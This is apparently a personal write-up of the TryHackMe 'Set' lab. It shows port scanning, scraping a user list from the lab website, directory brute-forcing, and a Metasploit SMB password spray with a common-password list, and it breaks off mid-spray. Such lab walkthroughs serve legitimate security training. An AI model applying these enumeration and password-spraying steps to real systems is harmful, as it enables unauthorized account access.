---
Once again you find yourself on the internal network of the Windcorp Corporation.
---

###  Set

![](https://i.imgur.com/UySYgtM.png)

![](https://tryhackme-images.s3.amazonaws.com/room-icons/b24d17051176c781124f199e22213b1f.jpeg)


 Start Machine

Story

Once again you find yourself on the internal network of the Windcorp Corporation. This tasted so good last time you were there, you came back for more.

However, they managed to secure the Domain Controller this time, so you need to find another server and on your first scan discovered "Set".

Set is used as a platform for developers and has had some problems in the recent past. They had to reset a lot of users and restore backups (maybe you were not the only hacker on their network?). So they decided to make sure all users used proper passwords and closed of some of the loose policies. Can you still find a way in? Are some user more privileged than others? Or some more sloppy? And maybe you need to think outside the box a little bit to circumvent their new security controls…

Happy Hacking!

@4nqr34z and @theart42

  

(Give it at least 5 minutes to boot)  

Answer the questions below

```
┌──(kali㉿kali)-[~]
└─$ ping 10.10.242.97
PING 10.10.242.97 (10.10.242.97) 56(84) bytes of data.
^C
--- 10.10.242.97 ping statistics ---
5 packets transmitted, 0 received, 100% packet loss, time 4092ms

                                                                                                              
┌──(kali㉿kali)-[~]
└─$ rustscan -a 10.10.242.97 --ulimit 5500 -b 65535 -- -A -Pn                   
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.242.97:135
Open 10.10.242.97:443
Open 10.10.242.97:445
Open 10.10.242.97:5985
Open 10.10.242.97:49667
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-02 10:05 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:05
Completed NSE at 10:05, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:05
Completed NSE at 10:05, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:05
Completed NSE at 10:05, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 10:05
Completed Parallel DNS resolution of 1 host. at 10:05, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 10:05
Scanning 10.10.242.97 [5 ports]
Discovered open port 443/tcp on 10.10.242.97
Discovered open port 135/tcp on 10.10.242.97
Discovered open port 445/tcp on 10.10.242.97
Discovered open port 49667/tcp on 10.10.242.97
Discovered open port 5985/tcp on 10.10.242.97
Completed Connect Scan at 10:05, 0.21s elapsed (5 total ports)
Initiating Service scan at 10:05
Scanning 5 services on 10.10.242.97
Completed Service scan at 10:06, 57.06s elapsed (5 services on 1 host)
NSE: Script scanning 10.10.242.97.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:06
NSE Timing: About 99.86% done; ETC: 10:07 (0:00:00 remaining)
Completed NSE at 10:07, 41.13s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:07
Completed NSE at 10:07, 1.75s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:07
Completed NSE at 10:07, 0.00s elapsed
Nmap scan report for 10.10.242.97
Host is up, received user-set (0.21s latency).
Scanned at 2023-01-02 10:05:49 EST for 100s

PORT      STATE SERVICE       REASON  VERSION
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
443/tcp   open  ssl/http      syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
| ssl-cert: Subject: commonName=set.windcorp.thm
| Subject Alternative Name: DNS:set.windcorp.thm, DNS:seth.windcorp.thm
| Issuer: commonName=set.windcorp.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-06-07T15:00:22
| Not valid after:  2036-10-07T15:10:21
| MD5:   d0eb717cf7ef351500d25d674bebdd69
| SHA-1: 95714370bd9bcc8008ef7d1e0dfcbbc2251ce077
| -----BEGIN CERTIFICATE-----
| MIIDQTCCAimgAwIBAgIQPqCqVnulP4RF1x6k8HNXqDANBgkqhkiG9w0BAQsFADAb
| MRkwFwYDVQQDDBBzZXQud2luZGNvcnAudGhtMB4XDTIwMDYwNzE1MDAyMloXDTM2
| MTAwNzE1MTAyMVowGzEZMBcGA1UEAwwQc2V0LndpbmRjb3JwLnRobTCCASIwDQYJ
| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAMm4DQZ+hDcuel1PQ+DKGJXKo8dF2mR+
| SJHlyPssa2iZx43jTijsYp+MxRPxSYzSuDy5M0eOIySHBN0JGWSKHLclNiwhDgAU
| niPdrrPgreA1Hs1Zw5UN7iLEz56R7NhEPctUwZb6+ETjO4x91TU3JMenEF+1ZLv3
| ss3X3MXKdv8y/KuHNPXsFf1ubioYKV3gmdsSlwLQpcATQ7LjeMdncAN62/OvXpVQ
| sFAdJkO1/LXIJquNdMzdim3PvFyPBStY6oX9sD5AiJ9/iMa91aqYjL8MXw7zPS4N
| FKpW/Ksx1AxbG41LQieEeGwEcC6Yq2ohSUNk3/RUrUA3IxN3up94t20CAwEAAaOB
| gDB+MA4GA1UdDwEB/wQEAwIFoDAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUH
| AwEwLgYDVR0RBCcwJYIQc2V0LndpbmRjb3JwLnRobYIRc2V0aC53aW5kY29ycC50
| aG0wHQYDVR0OBBYEFNQ2+9chAM4hq3nKcxQtg8Ah/1A/MA0GCSqGSIb3DQEBCwUA
| A4IBAQBB6BNqxh1cxyeeQ2D1VQ4D7nqGjp0oLNuwFFVd1Pk9f0aWWm0w1ovqOcCR
| 8BrCTJJlk/FjIYUrqLBvgkyFx7cL706tEGrFtZwi1KtMg8qReBQQBYVKa7jjN8/U
| dWRrbYwNuPmmojFZ1dZWilw++vCSkXxIKHbP6vvZDs7XewFYCT3Snbo/gFc3FCdy
| DwXM5ZQkzZnfTs6dAURqf8L7AVMxwBLow1Wl3nLuxoFQ3ypu5AyWCLROK8n5h82h
| mJLZQ6ectkh1JzoHaP8zA0Q0hxMvflatVAUDSztATJ7bJ81yok9I1eA4Eu+QI+sO
| 2yLhYxKlaeRK4AJ226n7dOxyrr8d
|_-----END CERTIFICATE-----
|_ssl-date: 2023-01-02T15:07:28+00:00; 0s from scanner time.
| tls-alpn: 
|_  http/1.1
|_http-server-header: Microsoft-HTTPAPI/2.0
445/tcp   open  microsoft-ds? syn-ack
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-01-02T15:06:49
|_  start_date: N/A
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 56458/tcp): CLEAN (Timeout)
|   Check 2 (port 28839/tcp): CLEAN (Timeout)
|   Check 3 (port 6182/udp): CLEAN (Timeout)
|   Check 4 (port 30620/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:07
Completed NSE at 10:07, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:07
Completed NSE at 10:07, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:07
Completed NSE at 10:07, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 101.20 seconds


┌──(kali㉿kali)-[~]
└─$ sudo nano /etc/hosts                                           
[sudo] password for kali: 
                                                                                                              
┌──(kali㉿kali)-[~]
└─$ tail /etc/hosts
10.129.105.231 s3.thetoppers.htb
10.10.11.180 shoppy.htb
10.10.11.180 mattermost.shoppy.htb
#10.10.219.166 windcorp.thm
10.10.85.102 fire.windcorp.thm
10.10.85.102 selfservice.windcorp.thm
10.10.85.102 selfservice.dev.windcorp.thm
10.10.167.117 team.thm
10.10.167.117 dev.team.thm
10.10.242.97 set.windcorp.thm


https://set.windcorp.thm/

view-source:https://set.windcorp.thm/

<script src="assets/js/search.js"> </script>

go to

xmlhttp.open("GET", "assets/data/users.xml" , true);

view-source:https://set.windcorp.thm/assets/data/users.xml

there are names and emails 

┌──(kali㉿kali)-[~/Set]
└─$ curl -k https://set.windcorp.thm/assets/data/users.xml -o users.xml
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 12419  100 12419    0     0  14214      0 --:--:-- --:--:-- --:--:-- 14258
                                                                                                              
┌──(kali㉿kali)-[~/Set]
└─$ cat users.xml                                                      
<?xml version="1.0"?>
<results_table>
<row>
<name>Aaron Wheeler</name>
<phone>9553310397</phone>
<email>aaronwhe@windcorp.thm</email>
</row>
<row>
<name>Addison Russell</name>
<phone>9425499327</phone>



┌──(kali㉿kali)-[~]
└─$ gobuster dir -u https://set.windcorp.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -k -x txt,php,py,html 
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://set.windcorp.thm/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Extensions:              html,txt,php,py
[+] Timeout:                 10s
===============================================================
2023/01/02 10:20:35 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 42259]
/blog.html            (Status: 200) [Size: 17537]
/assets               (Status: 301) [Size: 155] [--> https://set.windcorp.thm/assets/]
/forms                (Status: 301) [Size: 154] [--> https://set.windcorp.thm/forms/]
/Index.html           (Status: 200) [Size: 42259]
/Blog.html            (Status: 200) [Size: 17537]
/Forms                (Status: 301) [Size: 154] [--> https://set.windcorp.thm/Forms/]
/Assets               (Status: 301) [Size: 155] [--> https://set.windcorp.thm/Assets/]
/INDEX.html           (Status: 200) [Size: 42259]
/appnotes.txt         (Status: 200) [Size: 146]


https://set.windcorp.thm/appnotes.txt

Notes for the new user-module.

Send mail to user:

Welcome to Set!

Remember to change your default password at once. It is too common.

(password spraying attack vector to username)

┌──(kali㉿kali)-[~/Set]
└─$ awk -F'[<>]' '/email/ {sub("@windcorp.thm", "", $3); print $3}' users.xml

aaronwhe
addisonrus
aidenboy
alicepet
allisonnea
alyssabak
andreacur
andreahar
andreaste
andrewpow
aubreehop
beckywel
bernardmck
billiehil
billierya
brandonspe
brandyrod
braydenhaw
braydenweb
byronwil
calebrod
chloewes
christinerui
clairehay
craigmcd
danaros
danielletho
darrellpea
donbur
donper
ednahow
ednaper
ednarey
eugenewoo
fernandohun
flennrod
floydpet
gabrielall
gertrudewil
gilberttay
glendasny
gordonban
harveyrey
heidiwat
herminiacol
hollywel
hughfos
ivanray
jamiegra
janicekim
jasonper
jaydenhun
jillbec
jimmiebar
jimmypor
josebyr
juanitaram
juliocra
kayhar
kellyjen
kittymar
kristinfre
leahbur
leahlar
lenamoo
lesarog
maegut
marjorieada
masonmor
maxdou
meghancha
meghanhol
michellewat
miriamwar
myrtleowe
nataliearm
nataliepen
nathanielmar
nicholasram
normanand
normantur
owenkel
pamelagre
peggyhal
pennyray
peytonjam
phyllisric
priscillanew
randygre
reneeluc
rickyree
robertaphi
rodneyhen
rogermey
rosemarywes
rosenew
rosspow
roymas
rubensch
sallyhan
sallyort
sallyste
salvadorlee
sethhic
sohamkel
sohamtuc
sophiaboy
stephanierey
susansta
tammyjoh
thomasweb
tomand
veranic
vivangar
waderey
walterpal
waynewoo
wendyrob
wyattwhe
zacksul
                                                                                                              
┌──(kali㉿kali)-[~/Set]
└─$ awk -F'[<>]' '/email/ {sub("@windcorp.thm", "", $3); print $3}' users.xml > users_final.txt


using chatgpt :)

Este comando dividirá cada línea en campos cada vez que encuentre el carácter "<" o ">", y luego reemplazará la subcadena "@windcorp.thm" por una cadena vacía en el tercer campo (que es la dirección de correo electrónico). Por último, imprimirá el tercer campo (la dirección de correo electrónico sin el dominio) de las líneas que contengan la cadena "email".

┌──(kali㉿kali)-[/usr/share/seclists/Passwords/Common-Credentials]
└─$ cat top-20-common-SSH-passwords.txt 
root
toor
raspberry
dietpi
test
uploader
password
admin
administrator
marketing
12345678
1234
12345
qwerty
webadmin
webmaster
maintenance
techsupport
letmein
logon
Passw@rd
alpine
                                                                                                              
┌──(kali㉿kali)-[/usr/share/seclists/Passwords/Common-Credentials]
└─$ pwd              
/usr/share/seclists/Passwords/Common-Credentials


Now using msf

┌──(kali㉿kali)-[~/Set]
└─$ msfconsole -q                                                                              
msf6 > search smb_login

Matching Modules
================

   #  Name                             Disclosure Date  Rank    Check  Description
   -  ----                             ---------------  ----    -----  -----------
   0  auxiliary/scanner/smb/smb_login                   normal  No     SMB Login Check Scanner


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/smb/smb_login

msf6 > use 0
msf6 auxiliary(scanner/smb/smb_login) > show options

Module options (auxiliary/scanner/smb/smb_login):

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   ABORT_ON_LOCKOUT   false            yes       Abort the run when an account lockout is detected
   BLANK_PASSWORDS    false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED   5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS       false            no        Try each user/password couple stored in the current databas
                                                 e
   DB_ALL_PASS        false            no        Add all passwords in the current database to the list
   DB_ALL_USERS       false            no        Add all users in the current database to the list
   DB_SKIP_EXISTING   none             no        Skip existing credentials stored in the current database (A
                                                 ccepted: none, user, user&realm)
   DETECT_ANY_AUTH    false            no        Enable detection of systems accepting any authentication
   DETECT_ANY_DOMAIN  false            no        Detect if domain is required for the specified user
   PASS_FILE                           no        File containing passwords, one per line
   PRESERVE_DOMAINS   true             no        Respect a username that contains a domain name.
   Proxies                             no        A proxy chain of format type:host:port[,type:host:port][...
                                                 ]
   RECORD_GUEST       false            no        Record guest-privileged random logins to the database
   RHOSTS                              yes       The target host(s), see https://github.com/rapid7/metasploi
                                                 t-framework/wiki/Using-Metasploit
   RPORT              445              yes       The SMB service port (TCP)
   SMBDomain          .                no        The Windows domain to use for authentication
   SMBPass                             no        The password for the specified username
   SMBUser                             no        The username to authenticate as
   STOP_ON_SUCCESS    false            yes       Stop guessing when a credential works for a host
   THREADS            1                yes       The number of concurrent threads (max one per host)
   USERPASS_FILE                       no        File containing users and passwords separated by space, one
                                                  pair per line
   USER_AS_PASS       false            no        Try the username as the password for all users
   USER_FILE                           no        File containing usernames, one per line
   VERBOSE            true             yes       Whether to print output for all attempts


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/smb/smb_login) > set RHOSTS 10.10.242.97
RHOSTS => 10.10.242.97
msf6 auxiliary(scanner/smb/smb_login) > set PASS_FILE /usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt
PASS_FILE => /usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt
msf6 auxiliary(scanner/smb/smb_login) > set USER_FILE users_final.txt
USER_FILE => users_final.txt
msf6 auxiliary(scanner/smb/smb_login) > run

[*] 10.10.242.97:445      - 10.10.242.97:445 - Starting SMB login bruteforce
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aaronwhe:root',
[!] 10.10.242.97:445      - No active DB -- Credential data will not be saved!
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aaronwhe:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aaronwhe:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aaronwhe:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aaronwhe:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aaronwhe:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aaronwhe:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aaronwhe:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aaronwhe:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aaronwhe:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aaronwhe:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aaronwhe:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aaronwhe:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aaronwhe:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aaronwhe:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aaronwhe:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aaronwhe:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aaronwhe:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aaronwhe:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aaronwhe:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aaronwhe:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aaronwhe:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\addisonrus:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\addisonrus:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\addisonrus:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\addisonrus:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\addisonrus:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\addisonrus:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\addisonrus:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\addisonrus:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\addisonrus:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\addisonrus:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\addisonrus:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\addisonrus:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\addisonrus:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\addisonrus:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\addisonrus:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\addisonrus:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\addisonrus:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\addisonrus:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\addisonrus:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\addisonrus:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\addisonrus:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\addisonrus:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aidenboy:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aidenboy:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aidenboy:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aidenboy:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aidenboy:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aidenboy:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aidenboy:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aidenboy:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aidenboy:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aidenboy:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aidenboy:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aidenboy:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aidenboy:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aidenboy:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aidenboy:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aidenboy:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aidenboy:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aidenboy:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aidenboy:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aidenboy:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aidenboy:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\aidenboy:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\alicepet:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\alicepet:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\alicepet:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\alicepet:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\alicepet:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\alicepet:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\alicepet:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\alicepet:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\alicepet:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\alicepet:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\alicepet:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\alicepet:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\alicepet:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\alicepet:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\alicepet:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\alicepet:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\alicepet:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\alicepet:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\alicepet:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\alicepet:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\alicepet:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\alicepet:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\allisonnea:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\allisonnea:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\allisonnea:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\allisonnea:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\allisonnea:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\allisonnea:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\allisonnea:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\allisonnea:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\allisonnea:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\allisonnea:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\allisonnea:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\allisonnea:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\allisonnea:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\allisonnea:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\allisonnea:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\allisonnea:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\allisonnea:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\allisonnea:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\allisonnea:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\allisonnea:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\allisonnea:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\allisonnea:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\alyssabak:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\alyssabak:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\alyssabak:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\alyssabak:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\alyssabak:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\alyssabak:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\alyssabak:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\alyssabak:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\alyssabak:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\alyssabak:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\alyssabak:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\alyssabak:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\alyssabak:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\alyssabak:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\alyssabak:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\alyssabak:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\alyssabak:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\alyssabak:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\alyssabak:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\alyssabak:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\alyssabak:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\alyssabak:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreacur:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreacur:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreacur:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreacur:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreacur:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreacur:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreacur:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreacur:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreacur:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreacur:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreacur:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreacur:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreacur:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreacur:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreacur:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreacur:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreacur:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\andreacur:techsupport',
